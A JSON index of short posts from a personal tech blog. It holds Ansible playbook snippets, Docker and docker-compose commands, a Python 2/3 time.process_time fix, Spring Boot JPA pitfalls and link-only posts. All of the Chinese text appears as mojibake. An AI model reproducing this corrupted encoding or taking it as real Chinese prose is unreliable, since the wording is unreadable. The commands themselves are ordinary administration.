åº”ç”¨åˆ°playbookä¸­ï¼š--- - name: ansible playbook hosts: all remote_user: root become: yes vars: user_name: 'test' var_files: tasks: - name: Debian debug: msg: 'Debian' when: ansible_os_family == 'Debian' tags: - test æµ‹è¯•ï¼šansible-playbook play.yml -t test","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ansible å˜é‡","slug":"history/tech/5a20f1f84b0d20bd5c4f7b5c","date":"2017-11-30T18:08:56.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a20f1f84b0d20bd5c4f7b5c/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a20f1f84b0d20bd5c4f7b5c/","excerpt":"","text":"å¯ä»¥ä½¿ç”¨ vars æŒ‡å®šå˜é‡ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ var_files æŒ‡å®šå˜é‡æ–‡ä»¶--- - name: ansible playbook hosts: all remote_user: root become: yes vars: user_name: 'test' var_files: tasks: - name: æ·»åŠ ç”¨æˆ· user: name: '{{user_name}}' state: present groups: wheel,sudo append: yes tags: - user ä½¿ç”¨:ansible-playbook play.yml -t user --extra-vars 'user_name=test1'","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ansible æ·»åŠ ç”¨æˆ·","slug":"history/tech/5a20e3d64b0d20bd5c4f7b5b","date":"2017-11-30T17:08:38.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a20e3d64b0d20bd5c4f7b5b/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a20e3d64b0d20bd5c4f7b5b/","excerpt":"","text":"ansible æ·»åŠ ç”¨æˆ·:--- - name: ansible playbook hosts: all remote_user: root become: yes tasks: - name: æ·»åŠ ç”¨æˆ· user: name: test state: present groups: wheel,sudo append: yes tags: - user æµ‹è¯•:ansible-playbook play.yml -t user æŸ¥çœ‹:ansible all -a 'groups test' å¦‚æœæƒ³åˆ é™¤ç”¨æˆ·ï¼Œå¯ä»¥å°† state è®¾ç½®æˆ absentï¼Œ å¦‚æœæƒ³åŒæ—¶åˆ é™¤ç›®å½•ï¼Œåˆ™è®¾ç½® remove ä¸º yes --- - name: ansible playbook hosts: all remote_user: root become: yes tasks: - name: æ·»åŠ ç”¨æˆ· user: name: test state: absent remove: yes groups: wheel,sudo append: yes tags: - user è®¾ç½®å¯†ç --- - name: ansible playbook hosts: all remote_user: root become: yes tasks: - name: æ·»åŠ ç”¨æˆ· user: name: test state: present groups: wheel,sudo append: yes password: 'åŠ å¯†åçš„å¯†ç ' tags: - user","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ansible æ ‡ç­¾","slug":"history/tech/5a20e2d74b0d20bd5c4f7b5a","date":"2017-11-30T17:04:23.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a20e2d74b0d20bd5c4f7b5a/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a20e2d74b0d20bd5c4f7b5a/","excerpt":"","text":"ç»™ playbook çš„ä»»åŠ¡æ·»åŠ æ ‡ç­¾ï¼Œåœ¨è¿è¡Œä»»åŠ¡çš„æ—¶å€™æŒ‡å®šæ ‡ç­¾--- - name: ansible playbook hosts: all remote_user: root become: yes tasks: - name: æµ‹è¯•è¿æ¥ ping: tags: - test ansible tags:ansible-playbook play.yml --tags 'test' ansible-playbook play.yml --skip-tags 'test'","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"module object has no attribute process_time","slug":"history/tech/5a20211d4b0d20bd5c4f7b52","date":"2017-11-30T03:17:49.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a20211d4b0d20bd5c4f7b52/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a20211d4b0d20bd5c4f7b52/","excerpt":"","text":"æŠ¥é”™:12tic = time.process_time()&apos;module&apos; object has no attribute &apos;process_time&apos;æŸ¥çœ‹ python å®˜æ–¹æ–‡æ¡£:python2:https://docs.python.org/2/library/time.html#module-timepython3:https://docs.python.org/3/library/time.html#time.process_timetime.process_time å‡½æ•° python3 æ‰æœ‰","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"python","slug":"python","permalink":"https://wangxiuwen.github.io/tags/python/"}],"author":"wangxiuwen"},{"title":"python å¹¿æ’­","slug":"history/tech/5a2004154b0d20bd5c4f7b51","date":"2017-11-30T01:13:57.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a2004154b0d20bd5c4f7b51/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a2004154b0d20bd5c4f7b51/","excerpt":"","text":"https://docs.scipy.org/doc/numpy/user/basics.broadcasting.html","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"cassandra æ­å»º","slug":"history/tech/5a1fa69a4b0d20bd5c4f7b50","date":"2017-11-29T18:35:06.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a1fa69a4b0d20bd5c4f7b50/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a1fa69a4b0d20bd5c4f7b50/","excerpt":"","text":"æ‰“å¼€ rpc:vim conf/cassandra.yaml start_rpc: true web ui:https://github.com/sebgiroux/Cassandra-Cluster-Admin.git","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"webgl ç¼–ç¨‹æŒ‡å—","slug":"history/tech/5a1ed4394b0d20bd5c4f7b4f","date":"2017-11-29T03:37:29.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a1ed4394b0d20bd5c4f7b4f/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a1ed4394b0d20bd5c4f7b4f/","excerpt":"","text":"ä»£ç ä¸‹è½½:https://sites.google.com/site/webglbook/home/downloads","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"docker-compose","slug":"history/tech/5a1e78b74b0d20bd5c4f7b4e","date":"2017-11-28T21:07:03.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a1e78b74b0d20bd5c4f7b4e/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a1e78b74b0d20bd5c4f7b4e/","excerpt":"","text":"åˆ›å»º docker-compose.yml æ–‡ä»¶versionï¼š 3 servicesï¼š nginx: image: nginx ports: - &quot;8080:80&quot; networks: - &quot;otest&quot; volumes: - nest:/mnt networks: otest: driver: bridge volumes: nest: driver: local å¯åŠ¨docker-compose up docker-compose up -d docker-compose up ä¼šåˆ›å»ºé»˜è®¤çš„ç½‘ç»œæŸ¥çœ‹docker-compose ps execdocker-compose exec web /bin/bash åœæ­¢docker-compose stop # åé¢è·ŸæœåŠ¡ååˆ™åªåœæ­¢å…·ä½“çš„æœåŠ¡ åˆ é™¤docker-compose rm rm ä¸ä¼šåˆ é™¤æ‰åˆ›å»ºçš„ç½‘ç»œå’Œæ•°æ®å·åŒæ—¶åˆ é™¤æ‰ç½‘ç»œdocker-compose down","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"docker service","slug":"history/tech/5a1e6c684b0d20bd5c4f7b4d","date":"2017-11-28T20:14:32.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a1e6c684b0d20bd5c4f7b4d/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a1e6c684b0d20bd5c4f7b4d/","excerpt":"","text":"åˆ›å»ºä¸€ä¸ªæœåŠ¡ï¼šdocker service create --name web --network otest --publish 4080:80 --replicas 1 nignx æ°´å¹³æ‰©å±•æœåŠ¡(å¯å¢åŠ ï¼Œå¯å‡å°‘):docker service scale web=3 æŸ¥çœ‹æœåŠ¡:docker service ps web æ›´æ–°æœåŠ¡:docker service update web --image nginx:latest # æŒ‡å®šæ¯æ¬¡æ›´æ–°çš„æ•°é‡ï¼ŒæŒ‡å®šæ›´æ–°çš„é—´éš”æ—¶é—´ docker service update web --image nginx:latest --update-parallelism 2 --update-delay 6s","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"docker swarm é›†ç¾¤","slug":"history/tech/5a1e63944b0d20bd5c4f7b4c","date":"2017-11-28T19:36:52.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a1e63944b0d20bd5c4f7b4c/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a1e63944b0d20bd5c4f7b4c/","excerpt":"","text":"åˆå§‹åŒ– docker é›†ç¾¤ manage èŠ‚ç‚¹:docker swarm init --listen-addr 10.0.177.242:2377 æŸ¥çœ‹é›†ç¾¤ç°æœ‰èŠ‚ç‚¹:docker node ls æ·»åŠ èŠ‚ç‚¹åˆ° swarm é›†ç¾¤:docker swarm join --listen-addr 10.0.177.243:2377 --token `token` 10.0.177.242:2377 åœ¨ manage èŠ‚ç‚¹ æŸ¥çœ‹èŠ‚ç‚¹:docker node ls åˆ›å»ºç½‘ç»œdocker network create --driver overlay otest docker network ls","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"docker åŸºç¡€å‘½ä»¤","slug":"history/tech/5a1e5b6d4b0d20bd5c4f7b4b","date":"2017-11-28T19:02:05.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a1e5b6d4b0d20bd5c4f7b4b/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a1e5b6d4b0d20bd5c4f7b4b/","excerpt":"","text":"æœç´¢ nginx é•œåƒ:docker search nginx æŸ¥çœ‹æœ¬åœ°é•œåƒdocker images æ‹‰å–é•œåƒdocker pull ubuntu ä½¿ç”¨é˜¿é‡Œäº‘åŠ é€Ÿhttps://dev.aliyun.com/search.htmlæŸ¥çœ‹æœ¬åœ°å®¹å™¨docker ps -a # docker ps --all docker ps --all --latest # æŸ¥çœ‹æœ€è¿‘åˆ›å»ºçš„å®¹å™¨ æŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„å®¹å™¨docker ps æŸ¥çœ‹å®¹å™¨æ—¥å¿—docker logs `å®¹å™¨å/ID` docker logs --follow `å®¹å™¨å/ID` å¯åŠ¨å®¹å™¨docker start `å®¹å™¨å/ID` åœæ­¢å®¹å™¨ docker stop `å®¹å™¨å/ID` åˆ›å»ºå¸¦äº¤äº’çš„å®¹å™¨docker run --interactive --tty ubuntu /bin/bash åå°è¿è¡Œå®¹å™¨docker run --detach ubuntu ping baidu.com æäº¤å¯¹é•œåƒçš„ä¿®æ”¹docker commit -m &quot;æäº¤æ—¥å¿—&quot; -a &quot;ä½œè€…&quot; `å®¹å™¨å/ID` `ç”¨æˆ·å/é•œåƒå`:latest æ ¹æ® dockerfile åˆ›å»ºé•œåƒdockefile:FROM ubuntu RUN apt install nodejs-legacy æ‰§è¡Œå‘½ä»¤:docker build --tag qianrushi/nodejs:latest . ä¸Šä¼ é•œåƒdocker login # ç™»å½• docker hub docker push qianrushi/nodejs","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"docker ç½‘ç»œ","slug":"history/tech/5a1e4e124b0d20bd5c4f7b4a","date":"2017-11-28T18:05:06.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a1e4e124b0d20bd5c4f7b4a/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a1e4e124b0d20bd5c4f7b4a/","excerpt":"","text":"åˆ†ç±» bridge ç½‘ç»œåˆ›å»ºå®¹å™¨çš„æ—¶å€™ï¼Œå¦‚æœä¸æŒ‡å®š --net å‚æ•°ï¼Œåˆ™é»˜è®¤ä½¿ç”¨ bridge ç½‘ç»œï¼Œåœ¨ bridge ç½‘ç»œä¸‹çš„å®¹å™¨å¯ä»¥ç›´æ¥é€šä¿¡ none ç½‘ç»œå’Œå¤–ç•Œå®Œå…¨éš”ç¦»çš„ç½‘ç»œç¯å¢ƒdocker run -d --name test_none --net none nginx host ç½‘ç»œä½¿ç”¨ä¸»æœºç½‘ç»œï¼Œå³å’Œä¸»æœº ip ä¸€æ · å‘½ä»¤ æŸ¥çœ‹ docker ç½‘ç»œdocker network ls å…·ä½“æŸ¥çœ‹æŸä¸ªç½‘ç»œdocker network inspect bridge æŸ¥çœ‹ docker é•œåƒä½¿ç”¨ç«¯å£æŸ¥æ‰¾ ExposedPorts å­—æ®µ:docker inspect jenkins æŸ¥çœ‹ docker å®¹å™¨æ‰€ä½¿ç”¨çš„ç«¯å£docker port `å®¹å™¨id/å®¹å™¨å` ç«¯å£ç»‘å®šå°†å®¹å™¨çš„ 80 ç«¯å£ ç»‘å®šåˆ°æœ¬æœºä»»æ„ç«¯å£:docker run -d --name nginx --publish 80 nginx å°†å®¹å™¨æ‰€éœ€è¦ç»‘å®šçš„ç«¯å£ç»‘å®šåˆ°æœ¬æœºçš„ä»»æ„ç«¯å£:docker run -d --name nginx --publish-all nginx æˆ–è€…ç®€å†™:docker run -d --name nginx -P nginx è‡ªå®šä¹‰ç½‘ç»œæˆ‘ä»¬å¯ä»¥åŸºäºæŸä¸ªç½‘ç»œåˆ›å»ºè‡ªå®šä¹‰ç½‘ç»œï¼Œå±äºè¿™ä¸ªç½‘ç»œçš„å®¹å™¨ä¼šè¢«å•ç‹¬éš”ç¦»å‡ºæ¥ï¼Œè¿™äº›å®¹å™¨å¯ä»¥ç›´æ¥é€šä¿¡ï¼Œä½†æ˜¯ä¸åœ¨è¿™ä¸ªè‡ªå®šä¹‰ç½‘ç»œçš„å®¹å™¨ä¸èƒ½å¤Ÿç›´æ¥è®¿é—®ä»–ä»¬ï¼Œä¸€ä¸ªå®¹å™¨å¯ä»¥ä½¿ç”¨å¤šä¸ªç½‘ç»œã€‚åœ¨è‡ªå®šä¹‰ç½‘ç»œä¸­çš„å®¹å™¨å¯ä»¥é€šè¿‡ docker å†…åµŒçš„dns åŠŸèƒ½ä½¿ç”¨å„è‡ªçš„åå­—æ¥è®¿é—®å¯¹æ–¹ã€‚ åˆ›å»ºä¸€ä¸ªæ–°çš„ç½‘ç»œdocker network create --driver bridge nginx æŠŠå®¹å™¨æ”¾å…¥æŒ‡å®šçš„ç½‘ç»œdocker network connect `è¿æ¥åˆ°çš„ç½‘ç»œå` `è¦æ”¾åˆ°ç½‘ç»œä¸­çš„å®¹å™¨å` å°†å®¹å™¨ä»æŒ‡å®šç½‘ç»œä¸­ç§»é™¤docker network disconnect `è¦å»æ‰çš„ç½‘ç»œå` `è¦ä»ç½‘ç»œä¸­æ‹¿æ‰çš„å®¹å™¨å`","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"json to go","slug":"history/tech/5a1d79914b0d20bd5c4f7b49","date":"2017-11-28T02:58:25.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a1d79914b0d20bd5c4f7b49/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a1d79914b0d20bd5c4f7b49/","excerpt":"","text":"https://mholt.github.io/json-to-go/","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"go ä¹¦ç±","slug":"history/tech/5a1a3c9c4b0d20bd5c4f7b47","date":"2017-11-26T04:01:32.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a1a3c9c4b0d20bd5c4f7b47/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a1a3c9c4b0d20bd5c4f7b47/","excerpt":"","text":"https://github.com/astaxie/build-web-application-with-golang/blob/master/zh/preface.md","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"å¸¸è§ä¸­æ–‡åˆ†è¯å™¨","slug":"history/tech/5a1a72e34b0d20bd5c4f7b48","date":"2017-11-25T19:53:07.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a1a72e34b0d20bd5c4f7b48/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a1a72e34b0d20bd5c4f7b48/","excerpt":"","text":"ikansjjcsegHanLPwordjieyaé…·ç‹—ä¸­æ–‡åˆ†è¯å™¨ï¼šæ ¸å¿ƒè¯å…¸ï¼Œç®€ç¹ä½“è¯å…¸ï¼Œæ ‡ç‚¹ç¬¦å·è¯å…¸ï¼Œæ’é™¤è¯å…¸ï¼Œæ›¿æ¢è¯å…¸ æ··åˆå­—ç¬¦åˆ†è¯ (è‹±æ–‡åˆ†è¯ï¼Œä¸­è‹±æ–‡ï¼Œä¸­æ–‡æ•°å­—ï¼Œ æ•°å­—è‹±æ–‡ï¼Œæ ‡ç‚¹éæ ‡ç‚¹ç­‰) åŸºäºMMSEG","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"Spring boot jpa ä½¿ç”¨ EntityManagerFactory çš„æ³¨æ„äº‹é¡¹ã€‚æ•°æ®æºä½¿ç”¨çš„Druid","slug":"history/tech/5a17f8634b0d20bd5c4f7b46","date":"2017-11-23T22:45:55.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a17f8634b0d20bd5c4f7b46/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a17f8634b0d20bd5c4f7b46/","excerpt":"","text":"spring boot jpa ä½¿ç”¨ EntityManagerFactory è‡ªå®šè¯­å¥æŸ¥è¯¢ã€‚è®°å¾— closeã€‚å¦åˆ™è¿æ¥æ•°ä¼šæŒç»­çš„å¢åŠ ã€‚æ‰˜è·¨åº”ç”¨ã€‚é—®é¢˜æ’æŸ¥åŠæ³•ï¼šç”±äºæˆ‘ä½¿ç”¨çš„é˜¿é‡Œçš„Druidé…ç½®è¿æ¥çš„è‡ªåŠ¨å…³é—­ã€‚é…ç½®æˆªå›¾ä¸­çš„log-abandoned: trueæ–¹ä¾¿æ‰“å°å‡ºæ—¥å¿—ï¼Œæ’æŸ¥å“ªé‡Œçš„ä»£ç ä½¿ç”¨å ç”¨è¿æ¥æ²¡æœ‰å…³é—­ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"baipeng"},{"title":"c åç¨‹","slug":"history/tech/5a17db944b0d20bd5c4f7b45","date":"2017-11-23T20:43:00.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a17db944b0d20bd5c4f7b45/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a17db944b0d20bd5c4f7b45/","excerpt":"","text":"https://www.chiark.greenend.org.uk/~sgtatham/coroutines.html","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"åˆ¤æ–­ä¸¤ä¸ªå¹³é¢å¹³è¡Œ","slug":"history/math/5a17d3a84b0d20bd5c4f7b44","date":"2017-11-23T20:09:12.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/math/5a17d3a84b0d20bd5c4f7b44/","link":"","permalink":"https://wangxiuwen.github.io/history/math/5a17d3a84b0d20bd5c4f7b44/","excerpt":"","text":"ç¬¬ä¸€ä¸ªå¹³é¢æ‰¾ä¸€ä¸ªç‚¹ï¼Œç¬¬äºŒä¸ªå¹³é¢æ‰¾ä¸€ä¸ªç‚¹ï¼Œä¸¤ç‚¹è¿çº¿ä¸å…¶ä¸­ä¸€ä¸ªå¹³é¢çš„æ³•å‘é‡æ­£äº¤ï¼Œåˆ™ä¸¤å¹³é¢å¹³è¡Œã€‚","categories":[{"name":"æ•°å­¦","slug":"æ•°å­¦","permalink":"https://wangxiuwen.github.io/categories/%E6%95%B0%E5%AD%A6/"}],"tags":[{"name":"math","slug":"math","permalink":"https://wangxiuwen.github.io/tags/math/"},{"name":"æ•°å­¦","slug":"æ•°å­¦","permalink":"https://wangxiuwen.github.io/tags/%E6%95%B0%E5%AD%A6/"}],"author":"wangxiuwen"},{"title":"spring boot jpa å‘çˆ¹ç¬”è®°","slug":"history/tech/5a1643684b0d20bd5c4f7b42","date":"2017-11-23T03:41:28.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a1643684b0d20bd5c4f7b42/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a1643684b0d20bd5c4f7b42/","excerpt":"","text":"1 ä½¿ç”¨jpaè‡ªå¸¦çš„deleteæ–¹æ³•åˆ é™¤ å¯¹è±¡çš„æ—¶å€™ã€‚æ•°æ®åº“ä¸èƒ½ä¸ºç©ºçš„å­—æ®µ å¿…é¡»ä¼ å€¼ã€‚å¦è€…å°±æŠ¥å¼‚å¸¸ è¯¥å­—æ®µ not nullè§£å†³åŠæ³•ã€‚æŸ¥è¯¢å‡ºè¿™ä¸ªå¯¹è±¡ã€‚åœ¨ç»™deleteæ–¹æ³•åˆ é™¤ã€‚2 è‡ªå®šä¹‰çš„idç”Ÿæˆå™¨ã€‚ä½¿ç”¨çš„é›ªèŠ±ç®—æ³•ã€‚ä¸šåŠ¡éœ€è¦ï¼Œä¿®æ”¹äº†ä½æ•°çš„é•¿åº¦ã€‚ä½¿ç”¨jpaçš„save(list) æ–¹æ³• åœ¨åŒä¸€ä¸ªäº‹åŠ¡ä¸­å¿«é€Ÿæ’å…¥åˆ—è¡¨çš„æ—¶å€™ã€‚id ç”Ÿæˆé‡å¤ã€‚å¯¼è‡´æ’å…¥åˆ—è¡¨å¤±è´¥ã€‚è§£å†³åŠæ³•ï¼šæš‚æ—¶for list è°ƒç”¨saveFulshæ–¹æ³•ã€‚ä¸€ä¸ªä¸€ä¸ªçš„æ’å…¥åˆ·æ–°ååœ¨æ’å…¥ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"springboot","slug":"springboot","permalink":"https://wangxiuwen.github.io/tags/springboot/"},{"name":"jpa","slug":"jpa","permalink":"https://wangxiuwen.github.io/tags/jpa/"}],"author":"baipeng"},{"title":"atom åŒæ­¥ç¼–ç¨‹","slug":"history/tech/5a1664614b0d20bd5c4f7b43","date":"2017-11-22T18:02:09.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a1664614b0d20bd5c4f7b43/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a1664614b0d20bd5c4f7b43/","excerpt":"","text":"https://atom.io/packages/teletype","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"notepad++ é…ç½® go é«˜äº®","slug":"history/tech/5a143b794b0d20bd5c4f7b41","date":"2017-11-21T02:43:05.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a143b794b0d20bd5c4f7b41/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a143b794b0d20bd5c4f7b41/","excerpt":"","text":"ä¸‹è½½notepad++çš„goè¯­è¨€æ”¯æŒåŒ…å°†æ–‡ä»¶userDefineLang_Go.xmlå†…å®¹copyè‡³Application 